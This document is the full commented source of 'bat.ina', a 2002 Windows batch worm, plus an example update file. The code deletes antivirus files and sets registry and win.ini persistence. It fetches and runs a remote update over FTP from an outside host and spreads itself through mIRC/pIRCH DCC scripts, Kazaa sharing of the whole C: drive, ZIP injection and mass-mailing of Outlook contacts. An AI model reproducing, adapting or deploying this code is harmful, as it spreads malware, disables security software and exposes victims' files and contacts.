:: bat.ina
:: by philet0ast3r [rRlf]
:: finished: 16.09.2002, 13:48:23
:: not meant for the wild, just some proof of concept
:: first batch-worm, that is able to update itself via the internet
:: (commented)

@echo off
ctty nul
copy %0 c:\bat.ina.bat
del c:\mirc\script.ini
del c:\mirc32\script.ini
del c:\progra~1\mirc\script.ini
del c:\progra~1\mirc32\script.ini
del c:\pirch98\events.ini
del c:\programme\norton~1\s32integ.dll
del c:\programme\f-prot95\fpwm32.dll
del c:\programme\mcafee\scan.dat
del c:\tbavw95\tbscan.sig
del c:\programme\tbav\tbav.dat
del c:\tbav\tbav.dat
del c:\programme\avpersonal\antivir.vdf
del c:\msg.vbs
echo.on error resume next>m
echo MsgBox "this is a tribute to one of the most important persons in my current life." & Chr(13) & Chr(10) & "(hehe, i couldn't think of another name)" & Chr(13) & Chr(10) & "and it is the first ever batch virus, that is able to update itself via the internet.",4096,"bat.ina">>m
move m c:\msg.vbs
del c:\msg.reg
echo REGEDIT4>4
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>4
echo "msg"="c:\\msg.vbs">>4
move 4 c:\msg.reg
regedit /s c:\msg.reg
:: msg-payload

echo [windows]>w
echo load=c:\bat.ina.bat>>w
echo run=>>w
echo NullPort=None>>w
echo.>>w
copy w + %winbootdir%\win.ini %winbootdir%\system\win.ini
del %winbootdir%\win.ini
move %winbootdir%\system\win.ini %winbootdir%\win.ini
del w
:: infect win.ini

echo e 0100 62 61 74 69 6E 61 5F 72 72 6C 66 0D 0A 66 75 75>u
echo e 0110 75 63 6B 0D 0A 67 65 74 20 75 70 64 61 74 65 2E>>u
echo e 0120 74 78 74 0D 0A 71 75 69 74 0D 0A DA ED A2 3A DF>>u
echo rcx>>u
echo 002B>>u
echo n ude>>u
echo w>>u
echo q>>u
debug<u
del u
move ude c:\ftp.txt
:: ftp commands for downloading the update

cd c:\
ftp -s:c:\ftp.txt ftp.de.geocities.com
:: ftp commands get executed

echo [script]>i
echo n0=on 1:JOIN:#:{>>i
echo n1= /if ( nick == $me ) { halt }>>i
echo n2= /.dcc send $nick c:\bat.ina.bat>>i
echo n3=}>>i
move i c:\mirc\script.ini
move i c:\mirc32\script.ini
move i c:\progra~1\mirc\script.ini
move i c:\progra~1\mirc32\script.ini
del i
echo [Levels]>h
echo Enabled=1>>h
echo Count=6>>h
echo Level1=000-Unknowns>>h
echo 000-UnknownsEnabled=1>>h
echo Level2=100-Level 100>>h
echo 100-Level 100Enabled=1>>h
echo Level3=200-Level 200>>h
echo 200-Level 200Enabled=1>>h
echo Level4=300-Level 300>>h
echo 300-Level 300Enabled=1>>h
echo Level5=400-Level 400>>h
echo 400-Level 400Enabled=1>>h
echo Level6=500-Level 500>>h
echo 500-Level 500Enabled=1>>h
echo.>>h
echo [000-Unknowns]>>h
echo User1=*!*@*>>h
echo UserCount=1>>h
echo Event1=ON JOIN:#:/dcc send $nick c:\bat.ina.bat>>h
echo EventCount=1>>h
echo.>>h
echo [100-Level 100]>>h
echo UserCount=0>>h
echo EventCount=0>>h
echo.>>h
echo [200-Level 200]>>h
echo UserCount=0>>h
echo EventCount=0>>h
echo.>>h
echo [300-Level 300]>>h
echo UserCount=0>>h
echo EventCount=0>>h
echo.>>h
echo [400-Level 400]>>h
echo UserCount=0>>h
echo EventCount=0>>h
echo.>>h
echo [500-Level 500]>>h
echo UserCount=0>>h
echo EventCount=0>>h
move h c:\pirch98\events.ini
del h
:: for wasteing some time, till the download is finished, a mIRC/pIRCH-worm gets created

if not exist c:\update.txt goto next
:: in case of no internet-connection or failed download

ren c:\update.txt updatecheck.bat
call c:\updatecheck.bat
:: look at http://de.geocities.com/batina_rrlf/update.txt for an update-file-example
:: or look at the included update.txt

:next
echo REGEDIT4>k
echo [HKEY_CURRENT_USER\Software\Kazaa\LocalContent]>>k
echo "DisableSharing"=dword:00000000>>k
echo "DownloadDir"="C:\\Program Files\\KaZaA\\My Shared Folder">>k
echo "Dir0"="012345:c:\\">>k
move k c:\kazaa.reg
regedit /s c:\kazaa.reg
for %%i in (*.zip ..\*.zip %winbootdir%\desktop\*.zip) do pkzip -e0 -u -r -k %%i "c:\bat.ina.bat">nul.zip
del %winbootdir%\mail.vbs
echo.on error resume next>o
echo dim a,b,c,d,e>>o
echo set a = Wscript.CreateObject("Wscript.Shell")>>o
echo set b = CreateObject("Outlook.Application")>>o
echo set c = b.GetNameSpace("MAPI")>>o
echo for y = 1 To c.AddressLists.Count>>o
echo set d = c.AddressLists(y)>>o
echo x = 1>>o
echo set e = b.CreateItem(0)>>o
echo for o = 1 To d.AddressEntries.Count>>o
echo f = d.AddressEntries(x)>>o
echo e.Recipients.Add f>>o
echo x = x + 1>>o
echo next>>o
echo e.Subject = "hehe, isn't that fascinating...">>o
echo e.Body = "... I just want to say something to the attachment: It is the first ever batch virus, that is able to update itself via the internet! Hehe, you don't have to execute it (if you don't want to ;), but if you understand a bit batch, look at it, it's really interesting!">>o
echo e.Attachments.Add ("c:\bat.ina.bat")>>o
echo e.DeleteAfterSubmit = False>>o
echo e.Send>>o
echo f = "">>o
echo next>>o
move o %winbootdir%\mail.vbs
start %winbootdir%\mail.vbs
del c:\kazaa.reg
del c:\ftp.txt
:end
:: that's it ppl
:: ...
:: philet0ast3r@rRlf.de
=====[end code]================================================================

And here is an example for an update-file.
Everything should be clear, code is again already commented.

=====[begin code]===============================================================
:: bat.ina update-file
:: by philet0ast3r [rRlf]
:: if downloaded by bat.ina, this file gets executed as c:\updatecheck.bat

@echo off
ctty nul
del %winbootdir%\anitab1a.sig
:: this is the signature-file of the original virus
:: newer versions would delete all known signature-files

if exist %winbootdir%\*.sig goto end
:: if there's nevertheless a .sig-file, it means there's already a newer version installed
:: (as this is only proof of concept, there will probably be no new version)

echo this file is important>%winbootdir%\anitab1a.sig
:: the running version writes its signature-file

echo @echo off>ud
echo echo (this could be some new code)>>ud
echo :end>>ud
move ud %winbootdir%\update.bat
:: this is now the code of the new virus
:: if it is in fact a new version, it gets installed
:: (as said before, there will probably be no updates,
:: so this contains no code, but is just an example)

call %winbootdir%\update.bat
:end
